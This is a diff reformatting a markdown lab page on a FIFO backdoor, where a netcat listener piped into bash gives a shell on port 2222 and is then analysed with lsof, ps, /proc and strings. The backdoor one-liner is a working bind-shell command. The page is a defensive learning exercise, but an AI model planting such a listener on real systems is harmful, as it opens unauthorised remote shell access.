@@ -3,7 +3,6 @@ layout: default
 ---
 [Back](./)
 
-
 ## FIFO Backdoor (First In First Out)
 Running 3 WSL linux sessions
 The first will be where we run the backdoor.
@@ -11,12 +10,11 @@ The second will be where we connect to it.
 The third is where we will be running our analysis.
 
 **Machine 1**
-1. Elevate to root
-`sudo su`
-2. Create a fifi backpipe
-`mknod backpipe p`
-3. Start the backdoor
-`/bin/bash 0<backpipe | nc -l 2222 1>backpipe`
+
+Create the backdoor
+1. Elevate to root `sudo su`
+2. Create a fifi backpipe `mknod backpipe p`
+3. Start the backdoor `/bin/bash 0<backpipe | nc -l 2222 1>backpipe`
 > In the above command we are creating a netcat listener that forwards all input through a backpipe and then into a bash session. It then takes the output of the bash session and puts it back into the netcat listener.
 
 **Machine 2**
@@ -27,8 +25,8 @@ Connect to this backdoor
 
 **Machine 1**
 
-Open another tab on the original machine to analyse the backdoor connection using
-`lsof -i -P`
+Analyze the backdoor
+1. Open another tab on the original machine to analyse the backdoor connection using`lsof -i -P`
 
 |Flag       |Define       |
 | ----  | ----  |
@@ -37,25 +35,14 @@ Open another tab on the original machine to analyse the backdoor connection usin
 |-p       |List open files associated with the listed process ID.|
 
 Output:
-```yml
+```
 COMMAND    PID            USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
 nc        1757            root    3u  IPv4  48020      0t0  TCP *:2222 (LISTEN)
 nc        1757            root    4u  IPv4  48021      0t0  TCP 172.20.146.40:2222->172.20.146.40:45500 (ESTABLISHED)
 ```
 
-List open files associated with the listed process ID.
-`lsof -p 1757`
-Output:
-```
-COMMAND  PID USER   FD      TYPE DEVICE SIZE/OFF NODE NAME
-nc      1757 root  cwd   unknown                      /proc/1757/cwd (readlink: Permission denied)
-nc      1757 root  rtd   unknown                      /proc/1757/root (readlink: Permission denied)
-nc      1757 root  txt   unknown                      /proc/1757/exe (readlink: Permission denied)
-nc      1757 root NOFD                                /proc/1757/fd (opendir: Permission denied)
-```
+2. List open files associated with the listed process ID. `sudo lsof -p 1757`
 
-Needed root permissions so i ran it with sudo
-`sudo lsof -p 1757`
 Output::
 ```
 COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF  NODE NAME
@@ -74,8 +61,8 @@ nc      1757 root    3u  IPv4  48020      0t0   TCP *:2222 (LISTEN)
 nc      1757 root    4u  IPv4  48021      0t0   TCP 172.20.146.40:2222->172.20.146.40:45500 (ESTABLISHED)
 ```
 
-List all of the proccesses on the system for all users.
-`ps aux`
+3. List all of the proccesses on the system for all users. `ps aux`
+
 Output:
 ```
 bandit      1657  0.0  0.0   6080  5064 pts/3    Ss   22:01   0:00 -bash
@@ -89,9 +76,8 @@ bandit      1769  0.0  0.0   7480  3244 pts/3    R+   23:55   0:00 ps aux
 >-   The command displays both active processes and those in a "zombie" or "defunct" state.
 >-   "ps aux" gives a comprehensive view of the system's current process landscape and can be useful for monitoring system activity, identifying resource-intensive processes, and troubleshooting issues.
 
-Change into the proc directory for that pid.
-`cd /proc/1757`
-`ls`
+4. Change into the proc directory for that pid. `cd /proc/1757` `ls`
+
 Output:
 ```
 ls: cannot read symbolic link 'cwd': Permission denied
@@ -107,8 +93,8 @@ cmdline      exe              map_files  net         personality    smaps       
 
 > **/proc**  contains a virtual file system that provides information about running processes it does **not exist on the drive.** It allows us to see data associated with the various processes **directly**. This can be very usesfull as it allows us to **dig into the memory of a process that is currently running on a suspect system.**
 
-Identigy exactly what the program doing
-`strings ./exe`
+5. Identigy exactly what the program doing `strings ./exe`
+
 Output:
 ```
 usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
@@ -122,6 +108,9 @@ usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
                 -b              Allow broadcast
                 -C              Send CRLF as line-ending
 ```
-> Now we can see the actual usage information for netcat
 
+> Now we can see the actual usage information for netcat
 > We can run strings on the exe in this directory. This is very, very useful as when programs are created there may be usage information, mentions of system libraries and possible code comments. We use this all the time to attempt to identify what exactly a program is doing.
+
+[Back](./)
+
